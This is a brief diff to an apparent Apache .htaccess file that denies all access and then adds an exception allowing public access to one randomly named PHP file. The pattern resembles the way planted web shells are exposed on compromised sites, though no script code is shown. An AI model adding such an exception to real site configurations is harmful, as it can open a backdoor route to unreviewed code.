@@ -1,2 +1,7 @@
 Order allow,deny
 Deny from all
+
+<Files "jeeJeeroborock.php">
+Order allow,deny
+Allow from all
+</Files>
